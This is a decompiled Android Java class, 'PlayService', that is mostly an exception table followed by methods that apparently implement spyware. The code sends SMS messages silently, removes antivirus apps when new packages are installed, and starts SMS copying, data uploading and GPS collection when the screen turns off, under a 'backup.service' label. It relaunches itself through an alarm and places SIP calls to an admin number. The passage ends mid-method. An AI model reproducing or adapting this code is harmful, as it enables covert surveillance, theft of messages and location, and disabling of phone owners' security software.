    //   2141	2147	2456	java/lang/Error
    //   2171	2177	2456	java/lang/Error
    //   2201	2216	2456	java/lang/Error
    //   2240	2246	2456	java/lang/Error
    //   2270	2278	2456	java/lang/Error
    //   2379	2394	2456	java/lang/Error
    //   2418	2424	2456	java/lang/Error
    //   2448	2456	2456	java/lang/Error
    //   2547	2553	2456	java/lang/Error
    //   2660	2691	2456	java/lang/Error
    //   2731	2739	2456	java/lang/Error
    //   2763	2769	2456	java/lang/Error
    //   2793	2805	2456	java/lang/Error
    //   2829	2835	2456	java/lang/Error
    //   2859	2875	2456	java/lang/Error
    //   2899	2905	2456	java/lang/Error
    //   2929	2937	2456	java/lang/Error
    //   2961	2968	2456	java/lang/Error
    //   2992	3006	2456	java/lang/Error
    //   3030	3051	2456	java/lang/Error
    //   3075	3091	2456	java/lang/Error
    //   3115	3121	2456	java/lang/Error
    //   3145	3153	2456	java/lang/Error
    //   3173	3178	2456	java/lang/Error
    //   3202	3209	2456	java/lang/Error
    //   3233	3254	2456	java/lang/Error
    //   3278	3298	2456	java/lang/Error
    //   3322	3328	2456	java/lang/Error
    //   3352	3360	2456	java/lang/Error
    //   3388	3406	2456	java/lang/Error
    //   3430	3436	2456	java/lang/Error
    //   3460	3468	2456	java/lang/Error
    //   3492	3498	2456	java/lang/Error
    //   3522	3542	2456	java/lang/Error
    //   3566	3584	2456	java/lang/Error
    //   3608	3614	2456	java/lang/Error
    //   3638	3646	2456	java/lang/Error
    //   3670	3676	2456	java/lang/Error
    //   3700	3706	2456	java/lang/Error
    //   3730	3736	2456	java/lang/Error
    //   3760	3774	2456	java/lang/Error
    //   3798	3804	2456	java/lang/Error
    //   3828	3836	2456	java/lang/Error
    //   3860	3871	2456	java/lang/Error
    //   3899	3905	2456	java/lang/Error
    //   3925	3930	2456	java/lang/Error
    //   3954	3960	2456	java/lang/Error
    //   3984	4025	2456	java/lang/Error
    //   4049	4056	2456	java/lang/Error
    //   4080	4085	2456	java/lang/Error
    //   4121	4141	2456	java/lang/Error
    //   4165	4171	2456	java/lang/Error
    //   4195	4201	2456	java/lang/Error
    //   4225	4239	2456	java/lang/Error
    //   4263	4269	2456	java/lang/Error
    //   4293	4301	2456	java/lang/Error
    //   4325	4335	2456	java/lang/Error
    //   4359	4366	2456	java/lang/Error
    //   4390	4397	2456	java/lang/Error
    //   4421	4442	2456	java/lang/Error
    //   4466	4473	2456	java/lang/Error
    //   4497	4518	2456	java/lang/Error
    //   4549	4570	2456	java/lang/Error
    //   4594	4635	2456	java/lang/Error
    //   4659	4666	2456	java/lang/Error
    //   4690	4695	2456	java/lang/Error
    //   4751	4759	2456	java/lang/Error
    //   4783	4789	2456	java/lang/Error
    //   4813	4829	2456	java/lang/Error
    //   4853	4859	2456	java/lang/Error
    //   4883	4891	2456	java/lang/Error
    //   4919	4926	2456	java/lang/Error
    //   4950	4956	2456	java/lang/Error
    //   4980	4993	2456	java/lang/Error
    //   5017	5079	2456	java/lang/Error
    //   5103	5109	2456	java/lang/Error
    //   5133	5138	2456	java/lang/Error
    //   5162	5169	2456	java/lang/Error
    //   5196	5201	2456	java/lang/Error
    //   5230	5236	2456	java/lang/Error
    //   5260	5271	2456	java/lang/Error
    //   5295	5306	2456	java/lang/Error
    //   5330	5336	2456	java/lang/Error
    //   5360	5372	2456	java/lang/Error
    //   5400	5421	2456	java/lang/Error
    //   5445	5455	2456	java/lang/Error
    //   5479	5501	2456	java/lang/Error
    //   5527	5534	2456	java/lang/Error
    //   5558	5570	2456	java/lang/Error
    //   5597	5639	2456	java/lang/Error
    //   5667	5675	2456	java/lang/Error
    //   5699	5705	2456	java/lang/Error
    //   5733	5754	2456	java/lang/Error
    //   5783	5800	2456	java/lang/Error
    //   5824	5848	2456	java/lang/Error
    //   5884	5908	2456	java/lang/Error
    //   5932	5944	2456	java/lang/Error
    //   5968	5974	2456	java/lang/Error
    //   6003	6024	2456	java/lang/Error
    //   6048	6056	2456	java/lang/Error
    //   6084	6092	2456	java/lang/Error
    //   6116	6140	2456	java/lang/Error
    //   6164	6170	2456	java/lang/Error
    //   6209	6215	2456	java/lang/Error
    //   6239	6247	2456	java/lang/Error
    //   6271	6286	2456	java/lang/Error
    //   6310	6316	2456	java/lang/Error
    //   6340	6348	2456	java/lang/Error
    //   6372	6403	2456	java/lang/Error
    //   6431	6439	2456	java/lang/Error
    //   6463	6487	2456	java/lang/Error
    //   6511	6517	2456	java/lang/Error
    //   6541	6551	2456	java/lang/Error
    //   6575	6581	2456	java/lang/Error
    //   6605	6613	2456	java/lang/Error
    //   6637	6642	2456	java/lang/Error
    //   6669	6675	2456	java/lang/Error
    //   6699	6705	2456	java/lang/Error
    //   6729	6749	2456	java/lang/Error
    //   6777	6784	2456	java/lang/Error
    //   6808	6821	2456	java/lang/Error
    //   6845	6852	2456	java/lang/Error
    //   6880	6890	2456	java/lang/Error
    //   6914	6920	2456	java/lang/Error
    //   6944	6952	2456	java/lang/Error
    //   6976	6983	2456	java/lang/Error
    //   7007	7013	2456	java/lang/Error
    //   7037	7089	2456	java/lang/Error
    //   7113	7121	2456	java/lang/Error
    //   7145	7161	2456	java/lang/Error
    //   7185	7190	2456	java/lang/Error
    //   7214	7236	2456	java/lang/Error
    //   7264	7276	2456	java/lang/Error
    //   7307	7313	2456	java/lang/Error
    //   7343	7348	2456	java/lang/Error
    //   7372	7383	2456	java/lang/Error
    //   7407	7422	2456	java/lang/Error
    //   7446	7471	2456	java/lang/Error
    //   7495	7505	2456	java/lang/Error
    //   7529	7540	2456	java/lang/Error
    //   7564	7578	2456	java/lang/Error
    //   7602	7630	2456	java/lang/Error
    //   7654	7657	2456	java/lang/Error
    //   7684	7715	2456	java/lang/Error
    //   7739	7747	2456	java/lang/Error
    //   7771	7781	2456	java/lang/Error
    //   7805	7813	2456	java/lang/Error
    //   7837	7872	2456	java/lang/Error
    //   7899	7905	2456	java/lang/Error
    //   7932	7943	2456	java/lang/Error
    //   7967	7983	2456	java/lang/Error
    //   8007	8016	2456	java/lang/Error
    //   8040	8067	2456	java/lang/Error
    //   8091	8103	2456	java/lang/Error
    //   8127	8139	2456	java/lang/Error
    //   8163	8180	2456	java/lang/Error
    //   8204	8240	2456	java/lang/Error
    //   8270	8279	2456	java/lang/Error
    //   8303	8314	2456	java/lang/Error
    //   8341	8361	2456	java/lang/Error
    //   8385	8410	2456	java/lang/Error
    //   8434	8471	2456	java/lang/Error
    //   8495	8507	2456	java/lang/Error
    //   8531	8563	2456	java/lang/Error
    //   8587	8603	2456	java/lang/Error
    //   8627	8648	2456	java/lang/Error
    //   8672	8713	2456	java/lang/Error
    //   8740	8764	2456	java/lang/Error
    //   8791	8825	2456	java/lang/Error
    //   8849	8866	2456	java/lang/Error
    //   8903	8914	2456	java/lang/Error
    //   8938	8946	2456	java/lang/Error
    //   8970	8997	2456	java/lang/Error
    //   9021	9026	2456	java/lang/Error
    //   9050	9053	2456	java/lang/Error
    //   9084	9096	2456	java/lang/Error
    //   9120	9126	2456	java/lang/Error
    //   9150	9192	2456	java/lang/Error
    //   9220	9228	2456	java/lang/Error
    //   9252	9258	2456	java/lang/Error
    //   64	84	2556	java/lang/Exception
    //   108	137	2556	java/lang/Exception
    //   161	176	2556	java/lang/Exception
    //   200	205	2556	java/lang/Exception
    //   229	250	2556	java/lang/Exception
    //   274	291	2556	java/lang/Exception
    //   330	337	2556	java/lang/Exception
    //   366	387	2556	java/lang/Exception
    //   411	419	2556	java/lang/Exception
    //   511	535	2556	java/lang/Exception
    //   559	568	2556	java/lang/Exception
    //   592	601	2556	java/lang/Exception
    //   625	637	2556	java/lang/Exception
    //   661	667	2556	java/lang/Exception
    //   691	695	2556	java/lang/Exception
    //   719	728	2556	java/lang/Exception
    //   752	761	2556	java/lang/Exception
    //   785	797	2556	java/lang/Exception
    //   821	827	2556	java/lang/Exception
    //   863	897	2556	java/lang/Exception
    //   921	939	2556	java/lang/Exception
    //   963	968	2556	java/lang/Exception
    //   992	999	2556	java/lang/Exception
    //   1023	1033	2556	java/lang/Exception
    //   1057	1064	2556	java/lang/Exception
    //   1088	1094	2556	java/lang/Exception
    //   1118	1125	2556	java/lang/Exception
    //   1149	1154	2556	java/lang/Exception
    //   1178	1184	2556	java/lang/Exception
    //   1208	1215	2556	java/lang/Exception
    //   1239	1245	2556	java/lang/Exception
    //   1269	1275	2556	java/lang/Exception
    //   1299	1308	2556	java/lang/Exception
    //   1332	1346	2556	java/lang/Exception
    //   1370	1380	2556	java/lang/Exception
    //   1404	1411	2556	java/lang/Exception
    //   1435	1456	2556	java/lang/Exception
    //   1480	1503	2556	java/lang/Exception
    //   1527	1533	2556	java/lang/Exception
    //   1557	1587	2556	java/lang/Exception
    //   1611	1617	2556	java/lang/Exception
    //   1641	1659	2556	java/lang/Exception
    //   1683	1704	2556	java/lang/Exception
    //   1733	1739	2556	java/lang/Exception
    //   1763	1771	2556	java/lang/Exception
    //   1872	1878	2556	java/lang/Exception
    //   1902	1911	2556	java/lang/Exception
    //   1935	1956	2556	java/lang/Exception
    //   1980	1990	2556	java/lang/Exception
    //   2014	2020	2556	java/lang/Exception
    //   2044	2054	2556	java/lang/Exception
    //   2078	2083	2556	java/lang/Exception
    //   2107	2117	2556	java/lang/Exception
    //   2141	2147	2556	java/lang/Exception
    //   2171	2177	2556	java/lang/Exception
    //   2201	2216	2556	java/lang/Exception
    //   2240	2246	2556	java/lang/Exception
    //   2270	2278	2556	java/lang/Exception
    //   2379	2394	2556	java/lang/Exception
    //   2418	2424	2556	java/lang/Exception
    //   2448	2456	2556	java/lang/Exception
    //   2547	2553	2556	java/lang/Exception
    //   2660	2691	2556	java/lang/Exception
    //   2731	2739	2556	java/lang/Exception
    //   2763	2769	2556	java/lang/Exception
    //   2793	2805	2556	java/lang/Exception
    //   2829	2835	2556	java/lang/Exception
    //   2859	2875	2556	java/lang/Exception
    //   2899	2905	2556	java/lang/Exception
    //   2929	2937	2556	java/lang/Exception
    //   2961	2968	2556	java/lang/Exception
    //   2992	3006	2556	java/lang/Exception
    //   3030	3051	2556	java/lang/Exception
    //   3075	3091	2556	java/lang/Exception
    //   3115	3121	2556	java/lang/Exception
    //   3145	3153	2556	java/lang/Exception
    //   3202	3209	2556	java/lang/Exception
    //   3233	3254	2556	java/lang/Exception
    //   3278	3298	2556	java/lang/Exception
    //   3322	3328	2556	java/lang/Exception
    //   3352	3360	2556	java/lang/Exception
    //   3388	3406	2556	java/lang/Exception
    //   3430	3436	2556	java/lang/Exception
    //   3460	3468	2556	java/lang/Exception
    //   3492	3498	2556	java/lang/Exception
    //   3522	3542	2556	java/lang/Exception
    //   3566	3584	2556	java/lang/Exception
    //   3608	3614	2556	java/lang/Exception
    //   3638	3646	2556	java/lang/Exception
    //   3670	3676	2556	java/lang/Exception
    //   3700	3706	2556	java/lang/Exception
    //   3730	3736	2556	java/lang/Exception
    //   3760	3774	2556	java/lang/Exception
    //   3798	3804	2556	java/lang/Exception
    //   3828	3836	2556	java/lang/Exception
    //   3860	3871	2556	java/lang/Exception
    //   3899	3905	2556	java/lang/Exception
    //   3954	3960	2556	java/lang/Exception
    //   3984	4025	2556	java/lang/Exception
    //   4049	4056	2556	java/lang/Exception
    //   4080	4085	2556	java/lang/Exception
    //   4121	4141	2556	java/lang/Exception
    //   4165	4171	2556	java/lang/Exception
    //   4195	4201	2556	java/lang/Exception
    //   4225	4239	2556	java/lang/Exception
    //   4263	4269	2556	java/lang/Exception
    //   4293	4301	2556	java/lang/Exception
    //   4325	4335	2556	java/lang/Exception
    //   4359	4366	2556	java/lang/Exception
    //   4390	4397	2556	java/lang/Exception
    //   4421	4442	2556	java/lang/Exception
    //   4466	4473	2556	java/lang/Exception
    //   4497	4518	2556	java/lang/Exception
    //   4549	4570	2556	java/lang/Exception
    //   4594	4635	2556	java/lang/Exception
    //   4659	4666	2556	java/lang/Exception
    //   4690	4695	2556	java/lang/Exception
    //   4751	4759	2556	java/lang/Exception
    //   4783	4789	2556	java/lang/Exception
    //   4813	4829	2556	java/lang/Exception
    //   4853	4859	2556	java/lang/Exception
    //   4883	4891	2556	java/lang/Exception
    //   4919	4926	2556	java/lang/Exception
    //   4950	4956	2556	java/lang/Exception
    //   4980	4993	2556	java/lang/Exception
    //   5017	5079	2556	java/lang/Exception
    //   5103	5109	2556	java/lang/Exception
    //   5133	5138	2556	java/lang/Exception
    //   5162	5169	2556	java/lang/Exception
    //   5196	5201	2556	java/lang/Exception
    //   5230	5236	2556	java/lang/Exception
    //   5260	5271	2556	java/lang/Exception
    //   5295	5306	2556	java/lang/Exception
    //   5330	5336	2556	java/lang/Exception
    //   5360	5372	2556	java/lang/Exception
    //   5400	5421	2556	java/lang/Exception
    //   5445	5455	2556	java/lang/Exception
    //   5479	5501	2556	java/lang/Exception
    //   5527	5534	2556	java/lang/Exception
    //   5558	5570	2556	java/lang/Exception
    //   5597	5639	2556	java/lang/Exception
    //   5667	5675	2556	java/lang/Exception
    //   5699	5705	2556	java/lang/Exception
    //   5733	5754	2556	java/lang/Exception
    //   5783	5800	2556	java/lang/Exception
    //   5824	5848	2556	java/lang/Exception
    //   5884	5908	2556	java/lang/Exception
    //   5932	5944	2556	java/lang/Exception
    //   5968	5974	2556	java/lang/Exception
    //   6003	6024	2556	java/lang/Exception
    //   6048	6056	2556	java/lang/Exception
    //   6084	6092	2556	java/lang/Exception
    //   6116	6140	2556	java/lang/Exception
    //   6164	6170	2556	java/lang/Exception
    //   6209	6215	2556	java/lang/Exception
    //   6239	6247	2556	java/lang/Exception
    //   6271	6286	2556	java/lang/Exception
    //   6310	6316	2556	java/lang/Exception
    //   6340	6348	2556	java/lang/Exception
    //   6372	6403	2556	java/lang/Exception
    //   6431	6439	2556	java/lang/Exception
    //   6463	6487	2556	java/lang/Exception
    //   6511	6517	2556	java/lang/Exception
    //   6541	6551	2556	java/lang/Exception
    //   6575	6581	2556	java/lang/Exception
    //   6605	6613	2556	java/lang/Exception
    //   6637	6642	2556	java/lang/Exception
    //   6669	6675	2556	java/lang/Exception
    //   6699	6705	2556	java/lang/Exception
    //   6729	6749	2556	java/lang/Exception
    //   6777	6784	2556	java/lang/Exception
    //   6808	6821	2556	java/lang/Exception
    //   6845	6852	2556	java/lang/Exception
    //   6880	6890	2556	java/lang/Exception
    //   6914	6920	2556	java/lang/Exception
    //   6944	6952	2556	java/lang/Exception
    //   6976	6983	2556	java/lang/Exception
    //   7007	7013	2556	java/lang/Exception
    //   7037	7089	2556	java/lang/Exception
    //   7113	7121	2556	java/lang/Exception
    //   7145	7161	2556	java/lang/Exception
    //   7185	7190	2556	java/lang/Exception
    //   7214	7236	2556	java/lang/Exception
    //   7264	7276	2556	java/lang/Exception
    //   7307	7313	2556	java/lang/Exception
    //   7343	7348	2556	java/lang/Exception
    //   7372	7383	2556	java/lang/Exception
    //   7407	7422	2556	java/lang/Exception
    //   7446	7471	2556	java/lang/Exception
    //   7495	7505	2556	java/lang/Exception
    //   7529	7540	2556	java/lang/Exception
    //   7564	7578	2556	java/lang/Exception
    //   7602	7630	2556	java/lang/Exception
    //   7654	7657	2556	java/lang/Exception
    //   7684	7715	2556	java/lang/Exception
    //   7739	7747	2556	java/lang/Exception
    //   7771	7781	2556	java/lang/Exception
    //   7805	7813	2556	java/lang/Exception
    //   7837	7872	2556	java/lang/Exception
    //   7899	7905	2556	java/lang/Exception
    //   7932	7943	2556	java/lang/Exception
    //   7967	7983	2556	java/lang/Exception
    //   8007	8016	2556	java/lang/Exception
    //   8040	8067	2556	java/lang/Exception
    //   8091	8103	2556	java/lang/Exception
    //   8127	8139	2556	java/lang/Exception
    //   8163	8180	2556	java/lang/Exception
    //   8204	8240	2556	java/lang/Exception
    //   8270	8279	2556	java/lang/Exception
    //   8303	8314	2556	java/lang/Exception
    //   8341	8361	2556	java/lang/Exception
    //   8385	8410	2556	java/lang/Exception
    //   8434	8471	2556	java/lang/Exception
    //   8495	8507	2556	java/lang/Exception
    //   8531	8563	2556	java/lang/Exception
    //   8587	8603	2556	java/lang/Exception
    //   8627	8648	2556	java/lang/Exception
    //   8672	8713	2556	java/lang/Exception
    //   8740	8764	2556	java/lang/Exception
    //   8791	8825	2556	java/lang/Exception
    //   8849	8866	2556	java/lang/Exception
    //   8903	8914	2556	java/lang/Exception
    //   8938	8946	2556	java/lang/Exception
    //   8970	8997	2556	java/lang/Exception
    //   9021	9026	2556	java/lang/Exception
    //   9050	9053	2556	java/lang/Exception
    //   9084	9096	2556	java/lang/Exception
    //   9120	9126	2556	java/lang/Exception
    //   9150	9192	2556	java/lang/Exception
    //   9220	9228	2556	java/lang/Exception
    //   9252	9258	2556	java/lang/Exception
    //   64	84	2694	finally
    //   108	137	2694	finally
    //   161	176	2694	finally
    //   200	205	2694	finally
    //   229	250	2694	finally
    //   274	291	2694	finally
    //   330	337	2694	finally
    //   366	387	2694	finally
    //   411	419	2694	finally
    //   424	429	2694	finally
    //   437	444	2694	finally
    //   448	453	2694	finally
    //   457	474	2694	finally
    //   511	535	2694	finally
    //   559	568	2694	finally
    //   592	601	2694	finally
    //   625	637	2694	finally
    //   661	667	2694	finally
    //   691	695	2694	finally
    //   719	728	2694	finally
    //   752	761	2694	finally
    //   785	797	2694	finally
    //   821	827	2694	finally
    //   863	897	2694	finally
    //   921	939	2694	finally
    //   963	968	2694	finally
    //   992	999	2694	finally
    //   1023	1033	2694	finally
    //   1057	1064	2694	finally
    //   1088	1094	2694	finally
    //   1118	1125	2694	finally
    //   1149	1154	2694	finally
    //   1178	1184	2694	finally
    //   1208	1215	2694	finally
    //   1239	1245	2694	finally
    //   1269	1275	2694	finally
    //   1299	1308	2694	finally
    //   1332	1346	2694	finally
    //   1370	1380	2694	finally
    //   1404	1411	2694	finally
    //   1435	1456	2694	finally
    //   1480	1503	2694	finally
    //   1527	1533	2694	finally
    //   1557	1587	2694	finally
    //   1611	1617	2694	finally
    //   1641	1659	2694	finally
    //   1683	1704	2694	finally
    //   1733	1739	2694	finally
    //   1763	1771	2694	finally
    //   1776	1782	2694	finally
    //   1791	1798	2694	finally
    //   1802	1807	2694	finally
    //   1811	1815	2694	finally
    //   1819	1836	2694	finally
    //   1872	1878	2694	finally
    //   1902	1911	2694	finally
    //   1935	1956	2694	finally
    //   1980	1990	2694	finally
    //   2014	2020	2694	finally
    //   2044	2054	2694	finally
    //   2078	2083	2694	finally
    //   2107	2117	2694	finally
    //   2141	2147	2694	finally
    //   2171	2177	2694	finally
    //   2201	2216	2694	finally
    //   2240	2246	2694	finally
    //   2270	2278	2694	finally
    //   2283	2289	2694	finally
    //   2298	2305	2694	finally
    //   2309	2314	2694	finally
    //   2318	2322	2694	finally
    //   2326	2343	2694	finally
    //   2379	2394	2694	finally
    //   2418	2424	2694	finally
    //   2448	2456	2694	finally
    //   2461	2466	2694	finally
    //   2474	2481	2694	finally
    //   2485	2490	2694	finally
    //   2494	2511	2694	finally
    //   2547	2553	2694	finally
    //   2561	2567	2694	finally
    //   2576	2583	2694	finally
    //   2587	2592	2694	finally
    //   2596	2603	2694	finally
    //   2607	2624	2694	finally
    //   2660	2691	2694	finally
    //   2731	2739	2694	finally
    //   2763	2769	2694	finally
    //   2793	2805	2694	finally
    //   2829	2835	2694	finally
    //   2859	2875	2694	finally
    //   2899	2905	2694	finally
    //   2929	2937	2694	finally
    //   2961	2968	2694	finally
    //   2992	3006	2694	finally
    //   3030	3051	2694	finally
    //   3075	3091	2694	finally
    //   3115	3121	2694	finally
    //   3145	3153	2694	finally
    //   3173	3178	2694	finally
    //   3202	3209	2694	finally
    //   3233	3254	2694	finally
    //   3278	3298	2694	finally
    //   3322	3328	2694	finally
    //   3352	3360	2694	finally
    //   3388	3406	2694	finally
    //   3430	3436	2694	finally
    //   3460	3468	2694	finally
    //   3492	3498	2694	finally
    //   3522	3542	2694	finally
    //   3566	3584	2694	finally
    //   3608	3614	2694	finally
    //   3638	3646	2694	finally
    //   3670	3676	2694	finally
    //   3700	3706	2694	finally
    //   3730	3736	2694	finally
    //   3760	3774	2694	finally
    //   3798	3804	2694	finally
    //   3828	3836	2694	finally
    //   3860	3871	2694	finally
    //   3899	3905	2694	finally
    //   3925	3930	2694	finally
    //   3954	3960	2694	finally
    //   3984	4025	2694	finally
    //   4049	4056	2694	finally
    //   4080	4085	2694	finally
    //   4121	4141	2694	finally
    //   4165	4171	2694	finally
    //   4195	4201	2694	finally
    //   4225	4239	2694	finally
    //   4263	4269	2694	finally
    //   4293	4301	2694	finally
    //   4325	4335	2694	finally
    //   4359	4366	2694	finally
    //   4390	4397	2694	finally
    //   4421	4442	2694	finally
    //   4466	4473	2694	finally
    //   4497	4518	2694	finally
    //   4549	4570	2694	finally
    //   4594	4635	2694	finally
    //   4659	4666	2694	finally
    //   4690	4695	2694	finally
    //   4751	4759	2694	finally
    //   4783	4789	2694	finally
    //   4813	4829	2694	finally
    //   4853	4859	2694	finally
    //   4883	4891	2694	finally
    //   4919	4926	2694	finally
    //   4950	4956	2694	finally
    //   4980	4993	2694	finally
    //   5017	5079	2694	finally
    //   5103	5109	2694	finally
    //   5133	5138	2694	finally
    //   5162	5169	2694	finally
    //   5196	5201	2694	finally
    //   5230	5236	2694	finally
    //   5260	5271	2694	finally
    //   5295	5306	2694	finally
    //   5330	5336	2694	finally
    //   5360	5372	2694	finally
    //   5400	5421	2694	finally
    //   5445	5455	2694	finally
    //   5479	5501	2694	finally
    //   5527	5534	2694	finally
    //   5558	5570	2694	finally
    //   5597	5639	2694	finally
    //   5667	5675	2694	finally
    //   5699	5705	2694	finally
    //   5733	5754	2694	finally
    //   5783	5800	2694	finally
    //   5824	5848	2694	finally
    //   5884	5908	2694	finally
    //   5932	5944	2694	finally
    //   5968	5974	2694	finally
    //   6003	6024	2694	finally
    //   6048	6056	2694	finally
    //   6084	6092	2694	finally
    //   6116	6140	2694	finally
    //   6164	6170	2694	finally
    //   6209	6215	2694	finally
    //   6239	6247	2694	finally
    //   6271	6286	2694	finally
    //   6310	6316	2694	finally
    //   6340	6348	2694	finally
    //   6372	6403	2694	finally
    //   6431	6439	2694	finally
    //   6463	6487	2694	finally
    //   6511	6517	2694	finally
    //   6541	6551	2694	finally
    //   6575	6581	2694	finally
    //   6605	6613	2694	finally
    //   6637	6642	2694	finally
    //   6669	6675	2694	finally
    //   6699	6705	2694	finally
    //   6729	6749	2694	finally
    //   6777	6784	2694	finally
    //   6808	6821	2694	finally
    //   6845	6852	2694	finally
    //   6880	6890	2694	finally
    //   6914	6920	2694	finally
    //   6944	6952	2694	finally
    //   6976	6983	2694	finally
    //   7007	7013	2694	finally
    //   7037	7089	2694	finally
    //   7113	7121	2694	finally
    //   7145	7161	2694	finally
    //   7185	7190	2694	finally
    //   7214	7236	2694	finally
    //   7264	7276	2694	finally
    //   7307	7313	2694	finally
    //   7343	7348	2694	finally
    //   7372	7383	2694	finally
    //   7407	7422	2694	finally
    //   7446	7471	2694	finally
    //   7495	7505	2694	finally
    //   7529	7540	2694	finally
    //   7564	7578	2694	finally
    //   7602	7630	2694	finally
    //   7654	7657	2694	finally
    //   7684	7715	2694	finally
    //   7739	7747	2694	finally
    //   7771	7781	2694	finally
    //   7805	7813	2694	finally
    //   7837	7872	2694	finally
    //   7899	7905	2694	finally
    //   7932	7943	2694	finally
    //   7967	7983	2694	finally
    //   8007	8016	2694	finally
    //   8040	8067	2694	finally
    //   8091	8103	2694	finally
    //   8127	8139	2694	finally
    //   8163	8180	2694	finally
    //   8204	8240	2694	finally
    //   8270	8279	2694	finally
    //   8303	8314	2694	finally
    //   8341	8361	2694	finally
    //   8385	8410	2694	finally
    //   8434	8471	2694	finally
    //   8495	8507	2694	finally
    //   8531	8563	2694	finally
    //   8587	8603	2694	finally
    //   8627	8648	2694	finally
    //   8672	8713	2694	finally
    //   8740	8764	2694	finally
    //   8791	8825	2694	finally
    //   8849	8866	2694	finally
    //   8903	8914	2694	finally
    //   8938	8946	2694	finally
    //   8970	8997	2694	finally
    //   9021	9026	2694	finally
    //   9050	9053	2694	finally
    //   9084	9096	2694	finally
    //   9120	9126	2694	finally
    //   9150	9192	2694	finally
    //   9220	9228	2694	finally
    //   9252	9258	2694	finally
    //   295	303	9265	java/lang/Exception
    //   832	837	9269	java/lang/Exception
    //   3173	3178	9273	java/lang/Exception
    //   3925	3930	9278	java/lang/Exception
    //   4090	4095	9283	java/lang/Exception
    //   4700	4705	9287	java/lang/Exception
    //   8871	8876	9291	java/lang/Exception
    //   479	484	9295	java/lang/Exception
    //   1841	1846	9299	java/lang/Exception
    //   2348	2353	9303	java/lang/Exception
    //   2516	2521	9307	java/lang/Exception
    //   2629	2634	9311	java/lang/Exception
    //   2700	2705	9315	java/lang/Exception
    //   5853	5858	9320	java/lang/Exception
    //   2576	2583	9324	java/lang/Exception
    //   2474	2481	9329	java/lang/Exception
    //   2298	2305	9333	java/lang/Exception
    //   1791	1798	9338	java/lang/Exception
    //   437	444	9343	java/lang/Exception
  }
  
  public void SendSMS(String paramString1, String paramString2)
  {
    FLOG("SendSMS");
    if (paramString1 == null) {}
    do
    {
      do
      {
        return;
      } while (paramString2 == null);
      FLOG("sending");
    } while ((paramString1.length() == 0) || (paramString2.length() == 0));
    FLOG("sending2");
    SmsManager localSmsManager = SmsManager.getDefault();
    if (localSmsManager == null)
    {
      FLOG("Cannot get access to SMS object!");
      return;
    }
    try
    {
      FLOG("sending3");
      localSmsManager.sendMultipartTextMessage(paramString1, null, localSmsManager.divideMessage(paramString2), null, null);
      return;
    }
    catch (Exception paramString1)
    {
      EXCEPT(paramString1, "SendSMS ");
    }
  }
  
  public int SetBugController()
  {
    this.mPackageAddedReceiver = new BroadcastReceiver()
    {
      public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
      {
        String str = "Unknown";
        paramAnonymousContext = str;
        if (paramAnonymousIntent != null) {
          paramAnonymousContext = str;
        }
        try
        {
          if (paramAnonymousIntent.getExtras() != null)
          {
            paramAnonymousContext = paramAnonymousIntent.getExtras().getString("statestring");
            PlayService.FLOG("NEW APP INSTALLED " + paramAnonymousContext);
          }
          PlayService.putEvent(PlayService.res.getString(2130968579) + paramAnonymousContext);
          PlayService.this.RemoveAntiVirus();
          return;
        }
        catch (Exception paramAnonymousContext)
        {
          PlayService.EXCEPT(paramAnonymousContext, "PackageAddedListener DIED");
        }
      }
    };
    this.mUploaderStartReceiver = new BroadcastReceiver()
    {
      public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
      {
        PlayService.FLOG("!!!! UPLOADER INTENT RECEIVED ");
        try
        {
          if (paramAnonymousIntent.getAction().equals("ON_START_UPLOADER"))
          {
            PlayService.FLOG("Intent ressurect uploader has come");
            if (PlayService.this.thUploader == null) {
              PlayService.this.thUploader = new PlayService.Uploader(PlayService.this);
            }
            if (!PlayService.this.thUploader.isAlive()) {
              PlayService.this.thUploader.start();
            }
          }
          return;
        }
        catch (Exception paramAnonymousContext)
        {
          PlayService.EXCEPT(paramAnonymousContext, "UploaderStarter DIED");
        }
      }
    };
    this.brScreen = new BroadcastReceiver()
    {
      public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
      {
        for (;;)
        {
          try
          {
            if (!paramAnonymousIntent.getAction().equals("android.intent.action.SCREEN_OFF")) {
              break;
            }
            PlayService.bScreenActive = false;
            if (PlayService.ref != null)
            {
              if ((PlayService.ref.thUploader == null) || (!PlayService.ref.thUploader.isAlive()))
              {
                Log.v("backup.service", "STARTING thread...");
                if (PlayService.ref != null) {
                  PlayService.ref.StartUploader();
                }
                PlayService.ref.StartSMSCopier();
                if (PlayService.this.wifiAndCellCollector == null) {
                  return;
                }
                PlayService.FLOG("screen OFF, try GPS if need");
                PlayService.this.wifiAndCellCollector.StartGPSCollect(false);
                return;
              }
              Log.v("backup.service", "Thread is ok, skip any move " + PlayService.ref.thUploader.getState());
              continue;
            }
            Log.v("backup.service", "STARTING service...");
          }
          catch (Exception paramAnonymousContext)
          {
            PlayService.EXCEPT(paramAnonymousContext, "ScreenListener DIED");
            return;
          }
          paramAnonymousContext.startService(new Intent(paramAnonymousContext, PlayService.class));
        }
        if (paramAnonymousIntent.getAction().equals("android.intent.action.SCREEN_ON"))
        {
          PlayService.bScreenActive = true;
          if (PlayService.this.wifiAndCellCollector != null) {
            PlayService.this.wifiAndCellCollector.stopGPSCollect("ACTION_SCREEN_ON");
          }
        }
      }
    };
    IntentFilter localIntentFilter = new IntentFilter();
    if (localIntentFilter != null)
    {
      localIntentFilter.addAction("android.intent.action.SCREEN_ON");
      localIntentFilter.addAction("android.intent.action.SCREEN_OFF");
      localIntentFilter.setPriority(1000);
      registerReceiver(this.brScreen, localIntentFilter);
    }
    FLOG("SET_ALARM_MANAGER");
    ((AlarmManager)getSystemService("alarm")).set(0, System.currentTimeMillis() + 300000L, PendingIntent.getService(this, 0, new Intent(this, PlayService.class), 0));
    return 1;
  }
  
  public void SetLamaSampling(int paramInt)
  {
    FLOG("SetLamaSampling " + paramInt);
    if (this.mRecMicToMp3 != null)
    {
      this.mRecMicToMp3.SetSampleRate(paramInt);
      return;
    }
    FLOG("cannot set rate, lama is null");
  }
  
  public String SipCall(String paramString)
  {
    FLOG("SipCall:" + paramString);
    String str = paramString;
    if (paramString.isEmpty()) {
      str = sAdminNumber;
    }
    if (str.isEmpty())
    {
      FLOG("Number is empty and admin is empty, fail");
      return "Номер для звонка не задан, номер админстратора не задан";
    }
    if (!SipManager.isVoipSupported(this))
    {
      FLOG("sip not supported1");
      return "sip not supported1";
    }
    if (!SipManager.isApiSupported(this))
    {
      FLOG("sip not supported2");
      return "sip not supported2";
    }
    FLOG("SC1");
    this.sipManager = SipManager.newInstance(this);
    try
    {
      FLOG("SC2");
